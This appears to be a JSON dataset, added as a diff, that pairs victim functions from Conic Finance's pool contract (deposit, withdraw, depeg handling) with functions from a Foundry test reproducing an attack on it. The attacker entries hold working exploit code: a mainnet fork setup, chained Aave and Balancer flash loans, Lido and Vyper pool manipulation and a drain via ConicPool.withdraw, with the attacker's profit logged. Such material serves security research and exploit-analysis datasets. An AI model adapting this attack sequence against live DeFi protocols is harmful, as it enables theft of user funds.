@@ -1,0 +1,128 @@
+[
+  {
+    "contract/interface": "IConic",
+    "source_type": "victim_contract",
+    "function_name": "deposit",
+    "original_code": "    function deposit(\n        uint256 underlyingAmount,\n        uint256 minLpReceived\n    ) external override returns (uint256) {\n        return depositFor(msg.sender, underlyingAmount, minLpReceived, true);\n    }\n\n    /// @notice Deposit underlying\n    /// @param underlyingAmount Amount of underlying to deposit\n    /// @param minLpReceived The minimum amoun of LP to accept from the deposit\n    /// @param stake Whether or not to stake in the LpTokenStaker\n    /// @return lpReceived The amount of LP received\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IConic",
+    "source_type": "victim_contract",
+    "function_name": "handleDepeggedCurvePool",
+    "original_code": "    function handleDepeggedCurvePool(address curvePool_) external override {\n        // Validation\n        require(isRegisteredCurvePool(curvePool_), \"pool is not registered\");\n        require(weights.get(curvePool_) != 0, \"pool weight already 0\");\n        address lpToken_ = controller.curveRegistryCache().lpToken(curvePool_);\n        require(_isDepegged(lpToken_), \"pool is not depegged\");\n\n        // Set target curve pool weight to 0\n        // Scale up other weights to compensate\n        _setWeightToZero(curvePool_);\n        rebalancingRewardActive = true;\n\n        emit HandledDepeggedCurvePool(curvePool_);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IConic",
+    "source_type": "victim_contract",
+    "function_name": "withdraw",
+    "original_code": "    function withdraw(\n        uint256 conicLpAmount,\n        uint256 minUnderlyingReceived\n    ) public override returns (uint256) {\n        // Preparing Withdrawals\n        require(lpToken.balanceOf(msg.sender) >= conicLpAmount, \"insufficient balance\");\n        uint256 underlyingBalanceBefore_ = underlying.balanceOf(address(this));\n\n        // Processing Withdrawals\n        (\n            uint256 totalUnderlying_,\n            uint256 allocatedUnderlying_,\n            uint256[] memory allocatedPerPool\n        ) = getTotalAndPerPoolUnderlying();\n        uint256 underlyingToReceive_ = conicLpAmount.mulDown(_exchangeRate(totalUnderlying_));\n        {\n            if (underlyingBalanceBefore_ < underlyingToReceive_) {\n                uint256 underlyingToWithdraw_ = underlyingToReceive_ - underlyingBalanceBefore_;\n                _withdrawFromCurve(allocatedUnderlying_, allocatedPerPool, underlyingToWithdraw_);\n            }\n        }\n\n        // Sending Underlying and burning LP Tokens\n        uint256 underlyingWithdrawn_ = _min(\n            underlying.balanceOf(address(this)),\n            underlyingToReceive_\n        );\n        require(underlyingWithdrawn_ >= minUnderlyingReceived, \"too much slippage\");\n        lpToken.burn(msg.sender, conicLpAmount);\n        underlying.safeTransfer(msg.sender, underlyingWithdrawn_);\n\n        _cachedTotalUnderlying = totalUnderlying_ - underlyingWithdrawn_;\n        _cacheUpdatedTimestamp = block.timestamp;\n\n        emit Withdraw(msg.sender, underlyingWithdrawn_);\n        _reentrancyCheck();\n        return underlyingWithdrawn_;\n    }\n\n    function _withdrawFromCurve(\n        uint256 totalUnderlying_,\n        uint256[] memory allocatedPerPool,\n        uint256 amount_\n    ) internal {\n        uint256 withdrawalsRemaining_ = amount_;\n        uint256 totalAfterWithdrawal_ = totalUnderlying_ - amount_;\n\n        // NOTE: avoid modifying `allocatedPerPool`\n        uint256[] memory allocatedPerPoolCopy = allocatedPerPool.copy();\n\n        while (withdrawalsRemaining_ > 0) {\n            (uint256 curvePoolIndex_, uint256 maxWithdrawal_) = _getWithdrawPool(\n                totalAfterWithdrawal_,\n                allocatedPerPoolCopy\n            );\n            address curvePool_ = _curvePools.at(curvePoolIndex_);\n\n            // Withdrawing from least balanced Curve pool\n            uint256 toWithdraw_ = _min(withdrawalsRemaining_, maxWithdrawal_);\n            _withdrawFromCurvePool(curvePool_, toWithdraw_);\n            withdrawalsRemaining_ -= toWithdraw_;\n            allocatedPerPoolCopy[curvePoolIndex_] -= toWithdraw_;\n        }\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ConicFinanceTest",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ConicFinanceTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ConicFinanceTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ConicFinanceTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ConicFinanceTest",
+    "source_type": "attacker_contract",
+    "function_name": "executeOperation",
+    "original_code": "    function executeOperation(\n        address[] memory assets,\n        uint256[] memory amounts,\n        uint256[] memory premiums,\n        address initiator,\n        bytes memory params\n    ) external returns (bool) {\n        AaveV3.flashLoanSimple(address(this), address(cbETH), 850e18, bytes(\"\"), 0);\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ConicFinanceTest",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ConicFinanceTest",
+    "source_type": "attacker_contract",
+    "function_name": "receiveFlashLoan",
+    "original_code": "    function receiveFlashLoan(\n        address[] memory tokens,\n        uint256[] memory amounts,\n        uint256[] memory feeAmounts,\n        bytes memory userData\n    ) external {\n        for (uint256 i; i < 7; i++) {\n            depositAndExchange(121e18, 1, 0);\n        }\n        WETH.withdraw(20_000 * 1e18);\n        addLiquidityToLido();\n        removeLiquidityFromLido();\n        WETH.withdraw(WETH.balanceOf(address(this)) - 4200 * 1e15);\n        interactWithVyperContract2();\n        interactWithVyperContract1();\n        exchangeVyper(vyperContract2, 850e18, 0, 1);\n        ConicPool.withdraw(cncETH.balanceOf(address(this)), 0);\n        WETH.deposit{value: address(this).balance}();\n        exchangeVyper(vyperContract1, 1100 * 1e18, 0, 1);\n        WETH.withdraw(300e18);\n        exchangeLidoWETH();\n        // Repay flashloan\n        rETH.transfer(address(BalancerVault), 20_550 * 1e18);\n        cbETH.transfer(address(BalancerVault), 3000 * 1e18);\n        WETH.transfer(address(BalancerVault), 28_504_200 * 1e15);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ConicFinanceTest",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 17_740_954);\n        cheats.label(address(WETH), \"WETH\");\n        cheats.label(address(rETH), \"rETH\");\n        cheats.label(address(stETH), \"stETH\");\n        cheats.label(address(cbETH), \"cbETH\");\n        cheats.label(address(steCRV), \"steCRV\");\n        cheats.label(address(cbETH_ETHf), \"cbETH_ETHf\");\n        cheats.label(address(rETH_ETHf), \"rETH_ETHf\");\n        cheats.label(address(cncETH), \"cncETH\");\n        cheats.label(address(BalancerVault), \"BalancerVault\");\n        cheats.label(address(AaveV2), \"AaveV2\");\n        cheats.label(address(AaveV3), \"AaveV3\");\n        cheats.label(address(ConicPool), \"ConicPool\");\n        cheats.label(lidoPool, \"Lido\");\n        cheats.label(vyperContract1, \"vyperContract1\");\n        cheats.label(vyperContract2, \"vyperContract2\");\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ConicFinanceTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ConicFinanceTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ConicFinanceTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ConicFinanceTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ConicFinanceTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ConicFinanceTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ConicFinanceTest",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public {\n        deal(address(this), 0 ether);\n        emit log_named_decimal_uint(\"Attacker balance of ETH before exploit\", address(this).balance, 18);\n        WETH.approve(vyperContract1, type(uint256).max);\n        rETH.approve(vyperContract1, type(uint256).max);\n        WETH.approve(lidoPool, type(uint256).max);\n        stETH.approve(lidoPool, type(uint256).max);\n        WETH.approve(vyperContract2, type(uint256).max);\n        cbETH.approve(vyperContract2, type(uint256).max);\n        WETH.approve(address(ConicPool), type(uint256).max);\n        cbETH.approve(address(AaveV3), type(uint256).max);\n        stETH.approve(address(AaveV2), type(uint256).max);\n\n        address[] memory assets = new address[](1);\n        assets[0] = address(stETH);\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = 20_000 * 1e18;\n        uint256[] memory modes = new uint256[](1);\n        modes[0] = 0;\n\n        AaveV2.flashLoan(address(this), assets, amounts, modes, address(this), bytes(\"\"), 0);\n        exchangeVyper(vyperContract2, cbETH.balanceOf(address(this)), 1, 0);\n        exchangeLidoStETH();\n        exchangeVyper(vyperContract1, rETH.balanceOf(address(this)), 1, 0);\n        WETH.withdraw(WETH.balanceOf(address(this)));\n        emit log_named_decimal_uint(\"Attacker balance of ETH after exploit\", address(this).balance, 18);\n    }\n\n",
+    "description": ""
+  }
+]
